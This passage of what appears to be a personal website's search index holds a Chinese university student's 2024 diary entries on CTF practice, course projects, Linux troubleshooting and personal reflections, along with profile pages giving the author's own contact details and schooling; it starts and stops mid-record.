<p>\u672c\u6765\u60f3\u7ed9github.io\u5f04\u4e00\u4e2aCDN\u52a0\u901f\uff0c\u4f46\u662f\u56fd\u5185\u7684CDN\u5382\u5546\u57fa\u672c\u90fd\u4e0d\u652f\u6301github\u57df\u540d\u3002\u4f46\u662f\u5947\u602a\u7684\u662f\uff0c\u5982\u679c\u5728\u5fae\u4fe1/QQ\u4e2d\u8bbf\u95ee\u7f51\u7ad9\u901f\u5ea6\u5c31\u4f1a\u5f88\u5feb\uff0c\u96be\u9053\u2026\u2026\u5fae\u4fe1QQ\u81ea\u5e26Github\u52a0\u901f\uff1f</p>"},{"location":"ESSAY/jottings/2403/#240316","title":"240316","text":"<p>\u4f60\u5c45\u7136\u6084\u6084\u7ed9\u6211\u62a2\u9093\u7d2b\u68cb\u6f14\u5531\u4f1a\u95e8\u7968\uff08\u554a\u554a\u554a\uff09 <code>printf(\"LOVE LOVE SURPRISE SURPRISE\");</code>\uff08\u554a\u554a\u554a\u554a\u554a\u554a\u554a\u554a\u554a\u554a\uff09</p> <p>\u73b0\u5728\u4e00\u70b9\u513f\u4e5f\u4e0d\u60f3\u505aCTF\u9898\uff0c\u4e5f\u4e0d\u60f3\u5199\u5b9e\u9a8c\u62a5\u544a\u2026\u2026\u73b0\u5728\u4ec0\u4e48\u90fd\u4e0d\u60f3\u5f04\u3002</p> <p>\u4e0d\u77e5\u9053\u4e3a\u5565\uff0c\u4eca\u5929\u5565\u90fd\u4e0d\u60f3\u5e72\u3002CTFShow\u7684Sql\u6ce8\u5165\u505a\u4e86\u4e00\u9053\u9898\u5c31\u4e0d\u60f3\u505a\u4e86\uff0c\u7b97\u4e86\uff0c\u8fd8\u662f\u7ee7\u7eed\u5f04\u6587\u4ef6\u4e0a\u4f20\u5427\uff0c\u4e4b\u524d\u5c31\u89c9\u5f97upload-labs\u5f88\u6709\u610f\u601d\u3002</p> <p>\u6211\u5728\u60f3\u8981\u4e0d\u8981\u628a\u4e4b\u524d\u7684git\u8bb0\u5f55\u7ed9\u6e05\u9664\u6389\u3002</p>"},{"location":"ESSAY/jottings/2403/#240317","title":"240317","text":"<p>\u4eca\u5929\u5c31\u597d\u591a\u4e86\u611f\u89c9\u3002</p> <p>\u611f\u8c22\u6881\u5927\u54e5\u6350\u8d60\u76840.1\u5143\u4eba\u540d\u5e01\u54c8\u54c8\u54c8\u54c8\u54c8</p>"},{"location":"ESSAY/jottings/2403/#240319","title":"240319","text":"<p>\u4e0b\u5348\u6253\u4e86XXE\u9776\u573a\uff0c\u8fd9\u662f\u7b2c\u4e00\u6b21\u5c1d\u8bd5\u76f4\u63a5\u4e00\u4e2a\u865a\u62df\u673a\u5c31\u662f\u4e00\u4e2a\u9776\u573a\u7684\u8fd9\u79cd\uff0c\u5f88\u6709\u610f\u601d\uff0c\u6574\u4e2a\u8fc7\u7a0b\u90fd\u5f88\u6709\u610f\u601d\u3002</p>"},{"location":"ESSAY/jottings/2403/#240320","title":"240320","text":"<p>\u63a5\u4e0b\u6765\u7684\u4e00\u4e2a\u661f\u671f\u5de6\u53f3\u6211\u4f1a\u975e\u5e38\u975e\u5e38\u975e\u5e38\u5fd9\u3002</p>"},{"location":"ESSAY/jottings/2403/#240321","title":"240321","text":"<p>Bypass\u2026\u2026\u79d1\u6280\u6539\u53d8\u751f\u6d3b\uff01</p>"},{"location":"ESSAY/jottings/2403/#240323","title":"240323","text":"<p>\u4eca\u65e5\u6d3b\u52a8\uff1a<code>NKCTF 2024</code> + \u5fd7\u613f\u6d3b\u52a8</p> <p><code>NKCTF 2024</code>\u6bd4\u8d5b\u4f53\u9a8c\uff1a\u5750\u7262\uff0c\u9664\u4e86\u5750\u7262\u8fd8\u662f\u5750\u7262\u3002</p> <p>\u6211\u4e4b\u524d\u914d\u7f6e\u8fc7python2\u548cpython3\u7684\u73af\u5883\uff0c\u73b0\u5728\u60f3\u8981\u5f04\u4e00\u4e2aAnaconda\u7ba1\u7406python\u5e93\uff0c\u4f46\u662f\u6211\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u5c06\u539f\u6765\u7684python\u73af\u5883\u5bfc\u5165\u5230Anaconda\u91cc\u9762\uff0c\u6bd4\u8f83\u70e6\u2026\u2026</p>"},{"location":"ESSAY/jottings/2403/#240329","title":"240329","text":"<p>\u73b0\u5728\u5176\u5b9e\u5f88\u77db\u76fe\u5f88\u77db\u76fe\u3002</p>"},{"location":"ESSAY/jottings/2404/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2404","text":""},{"location":"ESSAY/jottings/2404/#240401","title":"240401","text":"<p>\u6700\u8fd1\u6709\u70b9\u5c0f\u5931\u7720\u2026\u2026</p>"},{"location":"ESSAY/jottings/2404/#240403","title":"240403","text":"<p>\u8c01\u77e5\u9053\u56de\u5230\u5bb6\u7a81\u7136\u89c1\u5230\u4e00\u4e2a\u597d\u51e0\u5e74\u4e0d\u89c1\u7684U\u76d8\u662f\u4ec0\u4e48\u611f\u89c9\u2026\u2026</p> <p>\u4e07\u5e78\u4e07\u5e78\u91cc\u9762\u7684\u6570\u636e\u90fd\u8fd8\u5728\u3002</p>"},{"location":"ESSAY/jottings/2404/#240405","title":"240405","text":"<p>\u4e0d\u77e5\u9053\u4e3a\u5565\uff0c\u4e00\u6574\u5929\u90fd\u5f88\u5934\u75bc\u3002</p> <p>\u660e\u5929\u53c8\u8981\u8fd4\u6821\u4e86\u3002</p>"},{"location":"ESSAY/jottings/2404/#240407","title":"240407","text":"<p>\u7528<code>pycharm</code>\u7ba1\u7406<code>python</code>\u5e93\u4e5f\u5f88OK\uff0c\u53cd\u6b63\u522b\u8ba9\u6211\u7528<code>anaconda</code>\u5c31\u884c\u3002</p> <p><code>PHP</code>\u53cd\u5e8f\u5217\u5316\u8fd8\u662f\u5f88\u6709\u610f\u601d\u7684\u3002</p>"},{"location":"ESSAY/jottings/2404/#240409","title":"240409","text":"<p>\u5f3a\u70c8\u63a8\u8350<code>Fitten Code</code>\uff0c\u7279\u522b\u7279\u522b\u597d\u7528\uff01\uff01\uff01\uff01\uff01</p> Python<pre><code>while\uff08life.contain(reget)&gt;0\uff09{\n    life.solve(reget);\n}\nlife.do(now);\n</code></pre>"},{"location":"ESSAY/jottings/2405/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2405","text":""},{"location":"ESSAY/jottings/2405/#240509","title":"240509","text":"<p>\u7a81\u7136\u5c315\u67089\u65e5\u4e86\uff0c\u5df2\u7ecf\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u5199\u8fc7\u968f\u7b14\u4e86\uff0c\u6700\u8fd1\u4e8b\u60c5\u7279\u522b\u591a\uff0c\u5f88\u5fd9\u5f88\u5fd9\uff0c\u5f88\u7d2f\u3002</p> <p>\u597d\u591a\u4e8b\u60c5\u5450\u2026\u2026\u800c\u4e14\u53ef\u9884\u89c1\u7684\uff0c\u4e4b\u540e\u8fd9\u6bb5\u65f6\u95f4\u4f1a\u66f4\u5fd9\u3002</p> <p>\u52a0\u6cb9\u5427\u3002</p> <p>\u4e3a\u4ec0\u4e48\u6211\u4ece\u5e94\u6025\u54cd\u5e94\u9776\u573a\u4e0a\u9762\u4e0b\u8f7d\u7684\u6d41\u91cf\u5305\u6253\u4e0d\u5f00\u554a\uff0c\u8fd9\u662f\u865a\u62df\u673a\u6587\u4ef6\u7684\u9505\u8fd8\u662f<code>WireShark</code>\u7684\u9505\u5450\u3002\u3002</p>"},{"location":"ESSAY/jottings/2408/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2408","text":""},{"location":"ESSAY/jottings/2408/#240823","title":"240823","text":"<p>\u8f6c\u773c\u95f4\u5c31\u53c8\u5feb9\u6708\u4efd\u4e86\uff0c\u9a6c\u4e0a\u5927\u4e8c\u5f00\u59cb\u4e86\u3002</p> <p>\u4eca\u665a\u674e\u8001\u5e08\u8bf7\u6211\u4eec\u51e0\u4e2a\u5403\u996d\uff0c\u8bf4\u4e86\u633a\u591a\u4e2a\u4eba\u53d1\u5c55\u7684\u4e1c\u897f\uff0c\u542c\u7740\u5b9e\u5728\u6709\u4e9b\u7126\u8651\u3002</p> <p>\u6211\u5df2\u7ecf\u5f88\u957f\u65f6\u95f4\u6ca1\u6709\u5199\u8fd9\u4e2a\u4e1c\u897f\u4e86\uff0c\u56de\u60f3\u4e00\u4e0b\u8fd9\u671f\u95f4\u5e72\u4e86\u4ec0\u4e48\u3002\u5927\u4e00\u4e0b\u5b66\u671f\u5f88\u5fd9\u5f88\u5fd9\uff0c\u4e5f\u5f88\u7d2f\uff0c\u4f46\u603b\u4f53\u6536\u83b7\u8fd8\u884c\uff0c\u5b66\u6821\u7684\u79d1\u76ee\u9664\u4e86\u67d0\u95e8\u8bfe\u5b9e\u5728\u662f\u62bd\u8c61\u4e4b\u5916\u90fd\u8fd8\u597d\uff0c\u4f46\u662f\u7f51\u7edc\u5b89\u5168\u65b9\u9762\u5b66\u4e60\u7684\u5e76\u4e0d\u662f\u5f88\u591a\u3002\u5956\u9879\u5f97\u4e86\u4e00\u4e2a\u84dd\u6865\u676f\u7f51\u5b89\u8d5b\u9053\u7701\u4e09\u3001ISCC\u56fd\u4e8c\u3001\u4e92\u8054\u7f51+\u7701\u4e09\u3002</p> <p>\u5047\u671f\u7684\u65f6\u5019\u627e\u4e86\u4e00\u4e2a\u56fd\u62a4\uff0c\u5185\u8499\u7684\u80fd\u6e90\u884c\u4e1a\uff0c\u4f46\u662f\u603b\u4f53\u4e5f\u6ca1\u4ec0\u4e48\u4e8b\uff0c\u4e00\u76f4\u6ca1\u6709\u771f\u5b9e\u653b\u51fb\u6d41\u91cf\u3002\u66f4\u522b\u8bf4\u5bf9\u81ea\u5df1\u7684\u6280\u672f\u6709\u63d0\u5347\u4e86\uff0c\u5c31\u662f\u7eaf\u8d5amoney\u4e86\u3002</p> <p>\u73b0\u5728\u8d8a\u6765\u8d8a\u89c9\u5f97\u6240\u7ecf\u5386\u7684\u4efb\u4f55\u4e8b\u60c5\uff0c\u4e0d\u8bba\u662f\u597d\u662f\u574f\uff0c\u4e0d\u7ba1\u5bf9\u81ea\u5df1\u662f\u6b63\u9762\u5f71\u54cd\u8fd8\u662f\u8d1f\u9762\u5f71\u54cd\uff0c\u90fd\u5bf9\u81ea\u5df1\u7684\u5404\u79cd\u5404\u79cd\u8fdb\u884c\u4e86\u5851\u9020\uff0c\u4e0d\u8bba\u662f\u5fc3\u667a\u8fd8\u662f\u60c5\u611f\u5386\u7a0b\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u4efb\u4f55\u4e8b\u60c5\u90fd\u662f\u6709\u5b83\u7684\u610f\u4e49\u5b58\u5728\u7684\u3002</p> <p>\u4e5f\u8d8a\u6765\u8d8a\u89c9\u7684\uff0c\u4e0d\u7ba1\u662f\u8fc7\u53bb\u8fd8\u662f\u672a\u6765\uff0c\u4e00\u5207\u4e8b\u60c5\u7684\u53d1\u751f\u90fd\u662f\u5df2\u7ecf\u6ce8\u5b9a\u7684\u3002\u4e5f\u4e00\u5b9a\u4f1a\u6709\u90a3\u4e48\u4e00\u4e2a\u5927\u6a21\u578b\uff0c\u80fd\u8ba1\u7b97\u51fa\u672a\u6765\u53d1\u751f\u7684\u6240\u6709\u4e8b\u3002</p> <p>\u6240\u4ee5\u4e5f\u6ca1\u5fc5\u8981\u7f8e\u5316\u672a\u66fe\u8d70\u7684\u90a3\u6761\u9053\u8def\uff0c\u90fd\u662f\u6ce8\u5b9a\u597d\u7684\u3002\u6211\u4eec\u4e5f\u4e0d\u80fd\u7ad9\u5728\u73b0\u5728\u7684\u9ad8\u5ea6\u53bb\u6279\u5224\u5f53\u5e74\u7684\u81ea\u5df1\uff0c\u8fd9\u4e0d\u516c\u5e73\uff0c\u5982\u679c\u518d\u6765\u4e00\u6b21\uff0c\u4ee5\u5f53\u5e74\u7684\u9605\u5386\u548c\u5fc3\u667a\uff0c\u4e5f\u4f1a\u505a\u51fa\u540c\u6837\u7684\u9009\u62e9\u3002\u4eba\u751f\u4ece\u6765\u6ca1\u6709\u767d\u8d70\u7684\u8def\uff0c\u4e5f\u4e0d\u53ef\u80fd\u6bcf\u4e00\u6b65\u90fd\u662f\u5bf9\u7684\uff0c\u4f46\u662f\u6bcf\u4e00\u6b65\u90fd\u4f5c\u6570\uff0c\u56e0\u4e3a\u60c5\u7eea\u548c\u56de\u5fc6\u90fd\u771f\u5b9e\u7684\u5b58\u5728\u8fc7\u3002\u4e5f\u4e0d\u8981\u9891\u9891\u56de\u5934\u770b\u4e86\uff0c\u672a\u6765\u4f1a\u8d8a\u6765\u8d8a\u597d\u7684\uff0c\u653e\u8fc7\u81ea\u5df1\u548c\u81ea\u5df1\u548c\u89e3\u5427\u3002</p> <p>\u4e0d\u8fc7\u8bdd\u8bf4\u56de\u6765\uff0c\u53c8\u5982\u4f55\u5462\uff1f\u5373\u4f7f\u5bf9\u81ea\u5df1\u7684\u5f71\u54cd\u518d\u5927\uff0c\u4e5f\u662f\u6240\u6539\u53d8\u4e0d\u4e86\u7684\u3002\u5373\u4f7f\u81ea\u5df1\u518d\u62fc\u5c3d\u5168\u529b\uff0c\u7ed3\u679c\u4e5f\u4f9d\u65e7\u662f\u90a3\u4e2a\u7ed3\u679c\uff0c\u90fd\u662f\u6ce8\u5b9a\u7684\uff0c\u8fd9\u79cd\u65e0\u529b\u611f\u554a\u3002\u4e5f\u56e0\u4e3a\u8fd9\u4e9b\uff0c\u6211\u53d1\u73b0\u81ea\u5df1\u8d8a\u6765\u8d8a\u559c\u6b22\u770b\u60b2\u5267\u6587\u5b66\u3001BE\u6587\u5b66\u3002\u770b\u91cc\u9762\u7684\u4eba\u7269\u7684\u6323\u624e\uff0c\u5374\u53c8\u65e0\u53ef\u5948\u4f55\u3002\u5728\u300a\u6d3b\u7740\u300b\u4e2d\uff0c\u798f\u8d35\u7684\u8d4c\u535a\u4e5f\u662f\u547d\u4e2d\u6ce8\u5b9a\u7684\uff0c\u8eab\u8fb9\u4eba\u7684\u79bb\u4e16\u4e5f\u662f\u6ce8\u5b9a\u7684\uff0c\u800c\u4e14\u662f\u4e0d\u53ef\u9884\u6599\u7684\uff0c\u8c01\u80fd\u77e5\u9053\u4e0b\u4e00\u79d2\u949f\u4f1a\u53d1\u751f\u4ec0\u4e48\u5462\uff1f\u4f46\u662f\u53d1\u751f\u5c31\u662f\u53d1\u751f\u4e86\uff0c\u4ed6\u53c8\u80fd\u505a\u4ec0\u4e48\u5462\uff1f\u4ec0\u4e48\u90fd\u505a\u4e0d\u4e86\u3002\u7ea2\u697c\u68a6\u91cc\u8c01\u53c8\u80fd\u963b\u6b62\u5bb6\u65cf\u7684\u6ca1\u843d\u5462\uff1f\u4e2a\u4eba\u7684\u547d\u8fd0\u65e9\u5728\u5224\u8bcd\u4e2d\u5c31\u6709\u4f53\u73b0\uff0c\u8c01\u53c8\u80fd\u6539\u53d8\u4e86\u5462\uff1f</p> <p>\u6211\u81ea\u5df1\u7ecf\u5e38\u56de\u5934\u770b\uff0c\u8fd9\u4e48\u957f\u65f6\u95f4\u4e86\uff0c\u4e5f\u8fd8\u662f\u4f1a\u9891\u9891\u5728\u68a6\u4e2d\u770b\u5230\u90a3\u4e9b\u4e8b\u3002\u4e09\u5e74\u53d1\u751f\u4e86\u597d\u591a\u4e8b\u554a\uff0c\u6709\u7684\u65f6\u5019\u5927\u8111\u5c31\u7a81\u7136\u88ab\u8fc7\u53bb\u7684\u67d0\u4e9b\u573a\u666f\u6240\u5360\u636e\u4e86\uff0c\u66fe\u7ecf\u7684\u90a3\u4e00\u9875\u4e00\u9875A4\u7eb8\uff0c\u81ea\u5df1\u6240\u611f\u53d7\u5230\u7684\u90a3\u6240\u6709\u6240\u6709\u7684\u60c5\u7eea\u2026\u2026\u4e0d\u8fc7\u81ea\u5df1\u53ea\u8981\u522b\u56de\u5934\u8d70\u5c31\u597d\u4e86\uff0c\u4e5f\u4e0d\u53ef\u80fd\u518d\u7ecf\u5386\u4e00\u6b21\u4e86\u3002\u65f6\u95f4\u4e4b\u5916\u7684\u5f80\u4e8b\u554a\uff0c\u65f6\u95f4\u4e4b\u5916\u7684\u5f80\u4e8b\u2026\u2026</p> <p>\u8fd9\u4e9b\u4e5f\u662f\u6ca1\u529e\u6cd5\u81ea\u5df1\u6539\u53d8\u7684\uff0c\u53ea\u80fd\u9760\u65f6\u95f4\u53bb\u6d88\u78e8\u3002\u65f6\u95f4\uff0c\u59cb\u7ec8\u662f\u6700\u5389\u5bb3\u7684\u4e1c\u897f\u3002</p> <p>\u5e9f\u8bdd\u8bf4\u4e86\u597d\u591a\uff0c\u4eca\u665a\u8fd9\u662f\u600e\u4e48\u4e86\u3002\u81ea\u5df1\u8fd9\u4e9b\u4e5f\u4e0d\u662f\u6d88\u6781\uff0c\u6211\u81ea\u8ba4\u4e3a\u662f\u4e00\u4e2a\u5f88\u79ef\u6781\u7684\u4eba\uff0c\u6709\u4ec0\u4e48\u673a\u4f1a\u603b\u60f3\u53bb\u4e89\u4e00\u4e89\uff0c\u4e5f\u633a\u597d\u7684\u5427\u3002</p> <p>\u4e0b\u4e2a\u5b66\u671f\u53ea\u4f1a\u66f4\u5fd9\uff0c\u4e5f\u5e0c\u671b\u80fd\u6536\u83b7\u6ee1\u6ee1\u5427\u3002\u867d\u7136\u81ea\u5df1\u4e0d\u77e5\u9053\u4f1a\u53d1\u751f\u4ec0\u4e48\uff0c\u5f88\u671f\u5f85\u3002\u8be5\u6765\u7684\u4e1c\u897f\u603b\u4f1a\u5728\u5408\u9002\u7684\u65f6\u5019\u6765\u7684\uff0c\u6240\u6709\u5851\u9020\u81ea\u5df1\u7684\u4e00\u70b9\u4e00\u6ef4\uff0c\u4e5f\u4e00\u5b9a\u4f1a\u5728\u67d0\u4e00\u65f6\u523b\u518d\u8d77\u5230\u4f5c\u7528\u7684\u3002</p>"},{"location":"ESSAY/jottings/2409/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2409","text":""},{"location":"ESSAY/jottings/2409/#240907","title":"240907","text":"<p>\u5f00\u5b66\u4e0a\u8bfe\u4e00\u5468\u4e86\uff0c\u524d\u4e09\u5468\u662f\u4f01\u4e1a\u5b9e\u8bad\uff0c\u6211\u9009\u7684\u662f<code>python\u5b9e\u8df5</code>\u3002</p> <p>\u9879\u76ee\u5927\u81f4\u662f\u4e09\u90e8\u5206\uff1a\u6570\u636e\u722c\u866b\u3001\u524d\u7aef\u4eff\u7ad9\u3001\u6570\u636e\u5206\u6790</p> <ul> <li>\u6570\u636e\u722c\u866b\uff1a\u7528<code>python</code>\u722c\u53d6\u6570\u636e\uff0c\u6211\u7528\u7684<code>requests\u3001mysql.connector\u3001BeautifulSoup\u3001re</code>\uff0c\u5927\u81f4\u5c31\u662f<code>requests</code>\u53d1\u8bf7\u6c42\uff0c\u7136\u540e<code>BeautifulSoup\u3001re</code>\u5206\u6790\u6709\u6548\u6570\u636e\uff0c\u7136\u540e<code>mysql.connector</code>\u5199\u5230<code>mysql</code>\u91cc\u9762\uff0c\u4e0d\u8fc7\u8001\u5e08\u6559\u7684\u662f\u5199\u5230<code>.csv</code>\u91cc\u9762</li> <li>\u524d\u7aef\u4eff\u7ad9\uff1a\u8fd9\u4e2a<code>css</code>\u8bf4\u5b9e\u8bdd\u6211\u73b0\u5728\u5e76\u4e0d\u77e5\u9053\u600e\u4e48\u505a\u4f1a\u597d\u4e00\u4e9b\uff0c<code>Github</code>\u4e0a\u9762\u6709\u4e00\u4e2a\u9879\u76ee\u662f\u622a\u56fe\u751f\u6210\u524d\u7aef\uff0c\u4f46\u662f\u9700\u8981<code>OpenAI</code>\u7684<code>Key</code>\uff0c\u6240\u4ee5\u6211\u4e5f\u6ca1\u5f04\u3002\u7136\u540e\u524d\u540e\u7aef\u4ea4\u4e92\uff08\u6570\u636e\u5e93\uff09\uff0c\u73b0\u5728\u6253\u7b97\u662f\u7528<code>Flask</code>\u6846\u67b6\uff0c\u4e5f\u60f3\u4e0d\u5230\u522b\u7684\u66f4\u597d\u7684\u4e86\u3002</li> <li>\u6570\u636e\u5206\u6790\uff1a\u8fd9\u4e2a\u5b8c\u5168\u6ca1\u770b\uff0c\u73b0\u6709\u60f3\u6cd5\u662f\u76f4\u63a5\u5f04\u51e0\u4e2a\u6700\u7b80\u5355\u7684\u6570\u636e\u5206\u6790\uff0c\u7136\u540e\u518d\u770b\u770b<code>Github</code>\u4e0a\u9762\u7684\u5927\u5c4f\u6570\u636e\u53ef\u89c6\u5316\uff0c\u7136\u540e\u770b\u770b\u80fd\u4e0d\u4e5f\u80fd\u8c03\u7528\u63a5\u53e3\uff0c\u6709\u65f6\u95f4\u7684\u8bdd\u5c31down\u51e0\u4e2a\u9879\u76ee\u7814\u7a76\u7814\u7a76\u3002</li> </ul> <p>\u73b0\u5728\u624d\u7b2c\u4e00\u5468\u7ed3\u675f\uff0c\u7136\u540e\u51e0\u4e4e\u4ece\u96f6\u5f00\u59cb\u5b66python\uff0c\u5df2\u7ecf\u80fd\u6b63\u5e38\u722c\u53d6\u6570\u636e\u5e76\u4e14\u5199\u5165\u5230\u6570\u636e\u5e93\u91cc\u9762\u4e86\uff0c\u4e5f\u5c31\u662f\u6570\u636e\u722c\u866b\u8fd9\u90e8\u5206\u5b8c\u6210\u4e86\uff0c\u7136\u540e\u7b2c\u4e8c\u5927\u90e8\u5206\uff0cFlask\u57fa\u7840\u5b66\u5b8c\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u591a\u6572\u8fc7\u4ee3\u7801\uff0c\u4e24\u5468\u5e94\u8be5\u2026\u2026\u52a0\u6cb9\u5457\u3002</p>"},{"location":"ESSAY/jottings/2409/#240907_1","title":"240907","text":"<p>\u8fd9\u4e2a3D\u6253\u5370\uff0c\u770b\u4e86\u770b<code>Github</code>\u4e0a\u7684\u9879\u76ee\uff0c\u611f\u89c9\u4e5f\u6ca1\u6709\u627e\u5230\u5565\u597d\u4e1c\u897f\u3002</p> <p>\u4f46\u662f\u5bf9\u4e8e\u6211\u6765\u8bf4\uff0c\u4e5f\u53ea\u80fd\u5148\u6a21\u4eff\u518d\u521b\u65b0\u554a\uff0c\u81ea\u5df1\u4ece\u5934\u5f00\u59cb\u5199\u771f\u7684\u662f\u4ec0\u4e48\u90fd\u4e0d\u77e5\u9053\uff0c\u7528\u4ec0\u4e48\u6280\u672f\u6808\u4e5f\u4e0d\u77e5\u9053\uff0c\u5b8c\u5168\u5c31\u662f\u65e0\u4ece\u4e0b\u624b\u7684\u72b6\u6001\u3002</p>"},{"location":"ESSAY/jottings/2409/#240912","title":"240912","text":"<p>\u521a\u521a\u5c0f\u9ed1\u76d2\u4e0a\u770b\u5230\u4e00\u4e2a\u5e16\u5b50\uff0c\u7a81\u7136\u8ba9\u6211\u60f3\u8d77\u4e86\u4ee5\u524d\uff0c\u4e5f\u662f\u5220\u597d\u53cb\u3002</p> <p>\u5176\u5b9e\u73b0\u5728\u56de\u60f3\u4e4b\u524d\u7684\u4e00\u4e9b\u4e8b\u60c5\uff0c\u65e9\u5728\u5f88\u957f\u65f6\u95f4\u4e4b\u524d\u5c31\u5e94\u8be5\u7ed3\u675f\u4e86\uff0c\u6839\u672c\u6ca1\u6709\u5fc5\u8981\u8fd9\u4e48\u4e00\u76f4\u62d6\u7740\u3002\u6216\u8bb8\u5f53\u65f6\u4faf\u6211\u6ca1\u6709\u901a\u8fc7\u90a3\u4e2a\u597d\u53cb\u7533\u8bf7\uff0c\u4e8b\u60c5\u662f\u4e0d\u662f\u4f1a\u53d8\u5f97\u4e0d\u4e00\u6837\uff1f\u8d77\u7801\uff0c\u6211\u4f1a\u4e0d\u4f1a\u6709\u66f4\u597d\u7684\u53bb\u5904\u3002</p> <p>\u82b1\u4e86\u8fd9\u4e48\u5927\u7684\u4ee3\u4ef7\uff0c\u534a\u4f1a\u4e0d\u4f1a\u7684\u61c2\u4e86\u4e00\u4e2a\u53ca\u65f6\u6b62\u635f\uff0c\u771f\u7684\u503c\u5f97\u5417\u2026\u2026</p>"},{"location":"ESSAY/jottings/2409/#240919","title":"240919","text":"<p>\u722c\u866b+\u53ef\u89c6\u5316\u8fd9\u4e2a\u9879\u76ee\u57fa\u672c\u4e0a\u7ed3\u675f\u4e86\u3002</p> <p>\u81ea\u5df1\u786e\u5b9e\u6709\u4e9b\u8fc7\u4e8e\u5bb9\u6613\u7126\u8651\u7740\u6025\u4e86\uff0c\u5f88\u591a\u4e8b\u60c5\u90fd\u662f\u5f88\u63d0\u524d\u7684\u53bb\u505a\uff0c\u751f\u6015\u4e4b\u540e\u4f1a\u51fa\u73b0\u4ec0\u4e48\u95ee\u9898\uff0c\u600e\u4e48\u8bf4\u5462\uff1f\u5373\u597d\u4e5f\u4e0d\u597d\u5427\uff0c\u8fd8\u662f\u522b\u592a\u7126\u8651\u4e86\u3002</p> <p>\u5927\u5b66\u7684\u5bb9\u9519\u7387\u9ad8\u7684\u8fdc\u8d85\u8fc7\u4f60\u7684\u60f3\u8c61\uff0c\u5f88\u591a\u4e1c\u897f\u90fd\u4f1a\u5728\u9002\u5f53\u7684\u65f6\u5019\u6765\u7684\uff0c\u4e0d\u8981\u8fc7\u4e8e\u7740\u6025\u4e86\u3002</p>"},{"location":"ESSAY/jottings/2409/#240920","title":"240920","text":"<p>\u65e0\u6240\u8c13\uff0c\u53c8\u5982\u4f55\u5462\uff1f</p> <p>\u5f97\u4e4b\u6211\u5e78\uff0c\u5931\u4e4b\u6211\u547d\u3002</p> <p>\u968f\u4fbf\uff0c\u6ca1\u5fc5\u8981\u3002\u53cd\u6b63\u600e\u6837\u90fd\u884c\u3002</p>"},{"location":"ESSAY/jottings/2409/#240920-2","title":"240920 -2","text":"<p>\u6211\u628a<code>yay</code>\u641e\u5d29\u4e86\uff0c\u7136\u540e\u67f3\u9752\u5f04\u4e86\u4e00\u665a\u7684<code>Arch</code>\uff0c\u7136\u540e\u624b\u52a8\u6784\u5efa\u4e86\u4e00\u4e2a<code>Mentohust</code>\uff0c\u67f3\u9752\u662f\u771f\u7684\u5f3a\u554a\u3002</p> <p>\u8fd9\u4e2a<code>Orange Pi</code>\u4e0d\u77e5\u9053\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u6709\u65f6\u5019\u5c31\u767b\u4e0d\u4e0a\u53bb\u4e86\uff0c\u663e\u793a\u5bc6\u7801\u9519\u8bef\uff0c<code>reboot</code>\u4e5f\u6267\u884c\u4e0d\u4e86\uff08\u4e5f\u662f\u9700\u8981\u5bc6\u7801\uff09\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u65ad\u7535\u91cd\u542f\u3002</p> <p>\u660e\u5929\u9700\u8981\u627e\u4e2a\u8ba4\u8bc1\uff0c\u6682\u65f6\u662f\u6253\u7b97\u76f4\u63a5\u7528<code>AP1</code>\u7684\uff0c<code>AP1</code>\u91cd\u65b0\u627e\u4e00\u4e2a\uff0c\u7136\u540e\u9700\u8981\u4fee\u597d<code>yay</code>\uff08Clash\u7684\u5c40\u57df\u7f51\u8fde\u63a5\u600e\u4e48\u4e00\u4f1a\u513f\u80fd\u7528\uff0c\u4e00\u4f1a\u513f\u4e0d\u80fd\u7528\u7684\u2026\u2026\uff09\uff0c\u7136\u540e\u8fd8\u9700\u8981\u628a<code>Mentohust</code>\u5199\u6210\u670d\u52a1\u8ba9\u5176\u81ea\u542f\u3002</p> <p>\u600e\u4e48\u8bf4\u5462\uff1f\u8fd8\u662f\u90a3\u53e5\u8bdd\uff0c\u67f3\u9752\u771f\u5f3a\uff01\uff01\uff01</p>"},{"location":"ME/","title":"\u6211","text":"<p>\u70b9\u51fb\u5de6\u4fa7\u76ee\u5f55\u6253\u5f00\u6587\u7ae0</p>"},{"location":"ME/account/","title":"\u4e2a\u4eba\u516c\u4f17\u8d26\u53f7","text":"<ul> <li> <p>GitHub</p> <ul> <li>\u5f00\u6e90\u4ee3\u7801\u4ed3\u5e93\uff08\u73b0\u5728\u8fd8\u4ec0\u4e48\u90fd\u6ca1\u6709\uff09</li> </ul> </li> <li> <p>\u4e2a\u4eba\u7f51\u7ad9</p> <ul> <li>\u535a\u5ba2\u3001\u6587\u7ae0</li> </ul> </li> </ul> <p>Note</p> <p>\u70b9\u51fb\u7f51\u7ad9\u53f3\u4e0b\u89d2\u7684\u56fe\u6807\u4e5f\u53ef\u4ee5\u5feb\u901f\u8df3\u8f6c</p>"},{"location":"ME/contact/","title":"\u4e2a\u4eba\u8054\u7cfb\u65b9\u5f0f","text":"<ul> <li>\u90ae\u7bb1\uff1ahou.ly@qq.com<ul> <li>\u90ae\u4ef6\u57fa\u672c\u4e0a\u4e00\u5929\u5185\u56de\u590d</li> </ul> </li> <li>QQ\uff1a3412506141<ul> <li>\u53ea\u8981\u7533\u8bf7\u4e00\u5b9a\u4f1a\u901a\u8fc7</li> <li>\u6d88\u606f\u57fa\u672c\u4e0a\u4e00\u5929\u5185\u56de\u590d</li> </ul> </li> </ul>"},{"location":"ME/experience/","title":"\u4e2a\u4eba\u7ecf\u5386","text":""},{"location":"ME/experience/#_2","title":"\u5b66\u4e60\u7ecf\u5386","text":"<ul> <li><code>2017.9 - 2020.6</code> \u5c71\u897f\u7701\u5e73\u9065\u4e2d\u5b66\u6821</li> <li><code>2020.9 - 2023.6</code> \u5c71\u897f\u7701\u5e73\u9065\u4e2d\u5b66\u6821</li> <li><code>2023.9 - 2027.6</code> \u4e2d\u5317\u5927\u5b66<ul> <li>\u5fc5\u4fee\u52a0\u9650\u9009\u8bfe\u7a0b<ul> <li>\u5e73\u5747\u5b66\u5206\u7ee9 